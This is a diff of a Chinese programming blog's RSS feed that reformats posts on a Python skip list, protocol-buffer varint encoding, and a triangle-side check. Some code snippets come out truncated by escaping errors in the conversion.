-	def adjustnodepor(self,prefixNode,downNode,value):&lt;br /&gt;
-		newnode=Node(value,prefixNode.rightp,prefixNode,None,downNode)&lt;br /&gt;
-		downNode.upp=newnode&lt;br /&gt;
-		if prefixNode.rightp:&lt;br /&gt;
-			prefixNode.rightp.leftp=newnode&lt;br /&gt;
-			prefixNode.rightp=newnode&lt;br /&gt;
-		else:&lt;br /&gt;
-			prefixNode.rightp=newnode&lt;br /&gt;
-		return newnode&lt;br /&gt;
-	def insert(self,value):&lt;br /&gt;
-		lowestlayerNode=self.findlowestLayer(value)&lt;br /&gt;
-		loc=self.getCurrentLayerInsertLoc(lowestlayerNode.pop(),value)&lt;br /&gt;
-		downNode=self.adjustnode(loc,value)&lt;br /&gt;
-		while self.randomup():&lt;br /&gt;
-			#print &quot;up %s&quot; %value&lt;br /&gt;
-			if(len(lowestlayerNode)!=0):&lt;br /&gt;
-				downNode=self.adjustnodepor(lowestlayerNode.pop(),downNode,value)&lt;br /&gt;
-			else:&lt;br /&gt;
-				newnode=Node()&lt;br /&gt;
-				newnode.downp=self.lefthead&lt;br /&gt;
-				self.lefthead.upp=newnode&lt;br /&gt;
-				self.lefthead=newnode&lt;br /&gt;
-				downNode=self.adjustnodepor(newnode,downNode,value)&lt;br /&gt;
-	def delete(self,value):&lt;br /&gt;
-		lowestlayerNode=self.findlowestLayer(value)&lt;br /&gt;
-		loc=self.getCurrentLayerInsertLoc(lowestlayerNode.pop(),value)&lt;br /&gt;
-		lowestlayerNode.append(loc)&lt;br /&gt;
-		for i in lowestlayerNode:&lt;br /&gt;
-			if i.value==value:&lt;br /&gt;
-				if i.rightp:&lt;br /&gt;
-					i.leftp.rightp=i.rightp&lt;br /&gt;
-					i.rightp.leftp=i.leftp&lt;br /&gt;
-					del(i)&lt;br /&gt;
-				else:&lt;br /&gt;
-					i.leftp.rightp=None&lt;br /&gt;
-					del(i)&lt;br /&gt;
-	def find(self,value):&lt;br /&gt;
-		tmphead=self.lefthead&lt;br /&gt;
-		while tmphead.downp:&lt;br /&gt;
-			while tmphead.rightp:&lt;br /&gt;
-				if tmphead.rightp.value&amp;gt;value:&lt;br /&gt;
-					break&lt;br /&gt;
-				elif tmphead.rightp.value==value:&lt;br /&gt;
-					print &quot;find&quot;&lt;br /&gt;
-					return&lt;br /&gt;
-				else:&lt;br /&gt;
-					tmphead=tmphead.rightp&lt;br /&gt;
-			tmphead=tmphead.downp&lt;br /&gt;
-		while tmphead.rightp:&lt;br /&gt;
-			if tmphead.rightp.value==value:&lt;br /&gt;
-				print &quot;find&quot;&lt;br /&gt;
-				return&lt;br /&gt;
-			tmphead=tmphead.rightp&lt;br /&gt;
-		if tmphead.value==value:&lt;br /&gt;
-			print &quot;find&quot;&lt;br /&gt;
-			return&lt;br /&gt;
-		else:&lt;br /&gt;
-			print &quot;not find&quot;&lt;br /&gt;
-			return&lt;/p&gt;
+    def findlowestLayer(self,newvalue):
+        tmphead=self.lefthead
+        tmpans=[]
+        while tmphead.downp:
+            while tmphead.rightp:
+                if tmphead.rightp.value&amp;amp;gt;newvalue:
+                    break
+                else:
+                    tmphead=tmphead.rightp
+            tmpans.append(tmphead)
+            tmphead=tmphead.downp
+        tmpans.append(tmphead)
+        return tmpans
+    def getCurrentLayerInsertLoc(self,Head,newvalue):
+        tmphead=Head
+        while(tmphead.rightp):
+            if tmphead.rightp.value&amp;amp;gt;newvalue:
+                return tmphead
+            else:
+                tmphead=tmphead.rightp
+        return tmphead
+    def randomup(self):
+        if random.randint(0,1)==0:
+            return False
+        else:
+            return True
+    def adjustnode(self,prefixNode,value):
+        newnode=Node(value,prefixNode.rightp,prefixNode,None,None)
+        if prefixNode.rightp:
+            prefixNode.rightp.leftp=newnode
+            prefixNode.rightp=newnode
+        else:
+            prefixNode.rightp=newnode
+        return newnode
+    def adjustnodepor(self,prefixNode,downNode,value):
+        newnode=Node(value,prefixNode.rightp,prefixNode,None,downNode)
+        downNode.upp=newnode
+        if prefixNode.rightp:
+            prefixNode.rightp.leftp=newnode
+            prefixNode.rightp=newnode
+        else:
+            prefixNode.rightp=newnode
+        return newnode
+    def insert(self,value):
+        lowestlayerNode=self.findlowestLayer(value)
+        loc=self.getCurrentLayerInsertLoc(lowestlayerNode.pop(),value)
+        downNode=self.adjustnode(loc,value)
+        while self.randomup():
+            #print &amp;quot;up %s&amp;quot; %value
+            if(len(lowestlayerNode)!=0):
+                downNode=self.adjustnodepor(lowestlayerNode.pop(),downNode,value)
+            else:
+                newnode=Node()
+                newnode.downp=self.lefthead
+                self.lefthead.upp=newnode
+                self.lefthead=newnode
+                downNode=self.adjustnodepor(newnode,downNode,value)
+    def delete(self,value):
+        lowestlayerNode=self.findlowestLayer(value)
+        loc=self.getCurrentLayerInsertLoc(lowestlayerNode.pop(),value)
+        lowestlayerNode.append(loc)
+        for i in lowestlayerNode:
+            if i.value==value:
+                if i.rightp:
+                    i.leftp.rightp=i.rightp
+                    i.rightp.leftp=i.leftp
+                    del(i)
+                else:
+                    i.leftp.rightp=None
+                    del(i)
+    def find(self,value):
+        tmphead=self.lefthead
+        while tmphead.downp:
+            while tmphead.rightp:
+                if tmphead.rightp.value&amp;amp;gt;value:
+                    break
+                elif tmphead.rightp.value==value:
+                    print &amp;quot;find&amp;quot;
+                    return
+                else:
+                    tmphead=tmphead.rightp
+            tmphead=tmphead.downp
+        while tmphead.rightp:
+            if tmphead.rightp.value==value:
+                print &amp;quot;find&amp;quot;
+                return
+            tmphead=tmphead.rightp
+        if tmphead.value==value:
+            print &amp;quot;find&amp;quot;
+            return
+        else:
+            print &amp;quot;not find&amp;quot;
+            return
 
-&lt;p&gt;sk=skipTable()&lt;br /&gt;
-for i in xrange(100):&lt;br /&gt;
-	sk.insert(random.randint(0,100))&lt;br /&gt;
-for i in xrange(20):&lt;br /&gt;
-	sk.delete(random.randint(0,100))&lt;/p&gt;
+sk=skipTable()
+for i in xrange(100):
+    sk.insert(random.randint(0,100))
+for i in xrange(20):
+    sk.delete(random.randint(0,100))
 
-&lt;p&gt;t=sk.lefthead&lt;br /&gt;
-headlist=[]&lt;br /&gt;
-while t:&lt;br /&gt;
-	headlist.append(t)&lt;br /&gt;
-	t=t.downp&lt;br /&gt;
-for i in headlist:&lt;br /&gt;
-	while i:&lt;br /&gt;
-		print i.value,&lt;br /&gt;
-		i=i.rightp&lt;br /&gt;
-	print &lt;br /&gt;
-sk.find(101)&lt;br /&gt;
-del(sk)&lt;/p&gt;
-</description>
+t=sk.lefthead
+headlist=[]
+while t:
+    headlist.append(t)
+    t=t.downp
+for i in headlist:
+    while i:
+        print i.value,
+        i=i.rightp
+    print 
+sk.find(101)
+del(sk)
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
                 <link>http://snorlaxzxz.com/program/2013/05/05/%E8%B7%B3%E8%A1%A8python%E5%AE%9E%E7%8E%B0</link>
                 <guid>http://snorlaxzxz.com/program/2013/05/05/跳表python实现</guid>
                 <pubDate>2013-05-05T00:00:00+08:00</pubDate>
@@ -697,46 +701,44 @@ del(sk)&lt;/p&gt;
         <item>
                 <title>关于protocol buffer 中的Base 128 Varints编码</title>
                 <description>&lt;p&gt;首先大致讲下protocol buffer 是大google用来改变世界的……（不过要干掉xml json什么的我感觉再过二十年吧……好像解析的速度也没有那么的重要&lt;br /&gt;
-其实具体的google的文档讲了很清楚了&lt;br /&gt;
-https://developers.google.com/protocol-buffers/docs/encoding#simple&lt;br /&gt;
-然后就是这个奇怪的新的编码、大致的好处我看下来感觉就是类似utf8那样可长可短根据数的大小来决定编码长度这样的&lt;br /&gt;
-然后拿他官方例子来讲&lt;br /&gt;
-比如300 来对他encode&lt;br /&gt;
-首先先把他转成二进制、然后进行补0 补整字节的倍数也就8的倍数&lt;br /&gt;
-然后进行逆序 最后对每个字节的8位进行填充、也就是每个字节的最高byte如果为1就是把后面那个字节的8位拿过来一起算、反正就是自己算&lt;br /&gt;
-然后是decode 也就是一个反序 先根据每个字节的最高位拆开成独立的小块 然后以字节为单位进行反序 再然后去0把他十进制读出思想就是这样但是有点疑惑这个倒序的意义我是一直没有明白= =&lt;br /&gt;
-好吧最后把代码贴出
-&lt;pre lang=&quot;python&quot;&gt;
-def encodebase128(ori):
-	t=str(bin(int(ori))[2:])
-	tmp=7
-	while len(t)&gt;tmp:
-		tmp*=2
-	t=&#39;0&#39;*(tmp-len(t))+t
-	ll=t[-7:]
-	for i in xrange(1,tmp/7):
-		ll+=t[-(i+1)*7:-i*7]
-	ans=&quot;&quot;
-	for i in xrange(0,tmp/7):
-		ans+=&#39;0&#39;
-		ans+=ll[i*7:(i+1)*7]
-	if tmp/7&gt;1:
-		ans=&#39;1&#39;+ans[1:]
-	return ans
-def decodebase128(dealed):
-	if len(dealed)%8!=0:
-		print &#39;illegal&#39;
-	tt=dealed[-7:]
-	for i in xrange(len(dealed)/8-1,0,-1):
-		tt+=dealed[(i-1)*8+1:(i)*8]
-	return int(&#39;0b&#39;+tt,2) 
-import sys
-t= encodebase128(sys.argv[1])
-print t
-print dealstring(t)&lt;/pre&gt;&lt;/p&gt;
+其实具体的google的文档讲了很清楚了
+&lt;a href=&quot;https://developers.google.com/protocol-buffers/docs/encoding#simple&quot;&gt;https://developers.google.com/protocol-buffers/docs/encoding#simple&lt;/a&gt;
+然后就是这个奇怪的新的编码、大致的好处我看下来感觉就是类似utf8那样可长可短根据数的大小来决定编码长度这样的
+然后拿他官方例子来讲
+比如300 来对他encode
+首先先把他转成二进制、然后进行补0 补整字节的倍数也就8的倍数
+然后进行逆序 最后对每个字节的8位进行填充、也就是每个字节的最高byte如果为1就是把后面那个字节的8位拿过来一起算、反正就是自己算
+然后是decode 也就是一个反序 先根据每个字节的最高位拆开成独立的小块 然后以字节为单位进行反序 再然后去0把他十进制读出思想就是这样但是有点疑惑这个倒序的意义我是一直没有明白= =  &lt;/p&gt;
 
-&lt;p&gt;&lt;/p&gt;
-</description>
+&lt;p&gt;好吧最后把代码贴出&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;encodebase128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ori&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ori&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:])&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ll&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ll&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ans&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ans&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ans&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ans&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ans&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ans&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decodebase128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dealed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dealed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;illegal&amp;#39;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;tt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dealed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dealed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;tt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dealed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;0b&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encodebase128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dealstring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
                 <link>http://snorlaxzxz.com/program/2013/04/26/%E5%85%B3%E4%BA%8Eprotocol-buffer-%E4%B8%AD%E7%9A%84base-128-varints%E7%BC%96%E7%A0%81</link>
                 <guid>http://snorlaxzxz.com/program/2013/04/26/关于protocol-buffer-中的base-128-varints编码</guid>
                 <pubDate>2013-04-26T00:00:00+08:00</pubDate>
@@ -744,56 +746,38 @@ print dealstring(t)&lt;/pre&gt;&lt;/p&gt;
 
         <item>
                 <title>list中判断是否存在三角形三边</title>
-                <description>&lt;p&gt;小时候数学好、因为能够有感觉知道每个条件他存在的意义、到了大学这种感觉渐渐消失了、直到今天突然那种感觉就回来了、因为那些条件恰恰是隐藏在数学自己的本身……&lt;br /&gt;
+                <description>&lt;p&gt;&lt;p&gt;小时候数学好、因为能够有感觉知道每个条件他存在的意义、到了大学这种感觉渐渐消失了、直到今天突然那种感觉就回来了、因为那些条件恰恰是隐藏在数学自己的本身……&lt;br /&gt;
 --------------------------------------------------------------------------&lt;br /&gt;
 把这个感觉带回给我的恰恰就是这么一道题、这道题真的非常非常简单、可是给我带来了不小的顿悟。原题大致是先图里求个最短路径然后判断路径中是否有可以组成三角形的存在&lt;br /&gt;
-也就是拆出了这么一个子问题、不知道是计算机编程写多了还是怎么样、已经逐渐开始依赖计算机强大的计算脑子都没半动一下就开始O(n^3)的暴力
-&lt;pre lang=&quot;c++&quot;&gt;
-for(int a=0; a &lt; pcnt &amp;&amp; !flag; a++)
-{
-    for(int b=a+1; b &lt; pcnt &amp;&amp; !flag; b++)
-    {
-        for(int c=b+1; c &lt; pcnt &amp;&amp; !flag; c++)
-        {
-            if(judge(pval[a],pval[b],pval[c]))
-            {
-                flag=true;
-            }
-        }
-    }
-}
-&lt;/pre&gt;
+也就是拆出了这么一个子问题、不知道是计算机编程写多了还是怎么样、已经逐渐开始依赖计算机强大的计算脑子都没半动一下就开始O(n&lt;sup&gt;3)的暴力&lt;/sup&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;for(int a=0; a 
 拿脚趾头想三次方肯定要TL、接着就是开始改进、首先想到了还是先对这些有意义的数组进行排序。然后使用自然而然的递增数组自己的优势那就是最小的两边之差一定是存在与相邻的数字里、注意这里就利用到了数字这个自身拥有美丽的属性的东西的属性。然后差不多代码是这样的
-&lt;pre lang=&quot;c++&quot;&gt;
-for (int a = 0; a &lt; pcnt-2 &amp;&amp; !flag; ++a)
-{
-    for(int j=a+1;j &lt; pcnt-1 &amp;&amp; !flag;j++)
-    {
-                    
-        if (pval[a] &gt; (pval[j+1]-pval[j]))
+
+for (int a = 0; a  (pval[j+1]-pval[j]))
         {
             flag=true;
         }
     }
 }
-&lt;/pre&gt;
-复杂度是O(n^2)当我们使用了数字他自身的属性后、也就是相当于他自身的一个条件、我们把一个复杂度进行了指数级别的下降、这是多么美妙的事情？当然还没有完、因为我们还有一个隐藏条件&lt;br /&gt;
-首先想想我们如何判定一个三角形&lt;br /&gt;
-1.所有任意两边之和大于第三边&lt;br /&gt;
-2.存在任意两边之差小于第三边&lt;br /&gt;
-条件1其实就等于是3个条件、为什么对判断同一个东西却判断的条件不同？原因就是存在于他们的符号、因为减法这个运算他本身就更为苛刻破坏了数字之间那种稳定的感觉（对不起我实在没有专业知识来说明这个感觉是什么）而看起来要判断三次的加法就非常好的维护了这个感觉、也就是我们小时候做数学的那种条件是正正好好的感觉、只是现在他们隐藏于了数字本身&lt;br /&gt;
-所以最终的代码其实非常简单&lt;/p&gt;
 
-&lt;p&gt;&lt;pre lang=&quot;c++&quot; /&gt;&lt;/p&gt;
+复杂度是O(n^2)当我们使用了数字他自身的属性后、也就是相当于他自身的一个条件、我们把一个复杂度进行了指数级别的下降、这是多么美妙的事情？当然还没有完、因为我们还有一个隐藏条件
+首先想想我们如何判定一个三角形
+1.所有任意两边之和大于第三边
+2.存在任意两边之差小于第三边
+条件1其实就等于是3个条件、为什么对判断同一个东西却判断的条件不同？原因就是存在于他们的符号、因为减法这个运算他本身就更为苛刻破坏了数字之间那种稳定的感觉（对不起我实在没有专业知识来说明这个感觉是什么）而看起来要判断三次的加法就非常好的维护了这个感觉、也就是我们小时候做数学的那种条件是正正好好的感觉、只是现在他们隐藏于了数字本身
+所以最终的代码其实非常简单
 
-&lt;p&gt;for(int i=0;i &lt; pcnt-2;i++)&lt;br /&gt;
+
+
+for(int i=0;i 
 {
-    if(pval[i]+pval[i+1] &gt; pv[i+2])&lt;br /&gt;
-        break;&lt;br /&gt;
+    if(pval[i]+pval[i+1] &amp;gt; pv[i+2])
+        break;
 }
 
-通过数字他自身我们其实只需要O(n)足已&lt;/p&gt;
-</description>
+通过数字他自身我们其实只需要O(n)足已
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
                 <link>http://snorlaxzxz.com/program/2013/04/09/list%E4%B8%AD%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%B8%89%E8%A7%92%E5%BD%A2%E4%B8%89%E8%BE%B9</link>
                 <guid>http://snorlaxzxz.com/program/2013/04/09/list中判断是否存在三角形三边</guid>
                 <pubDate>2013-04-09T00:00:00+08:00</pubDate>
@@ -806,40 +790,34 @@ for (int a = 0; a &lt; pcnt-2 &amp;&amp; !flag; ++a)
 &lt;p&gt;&lt;h4&gt;题目列表 &gt; 踩方格&lt;/h4&gt;
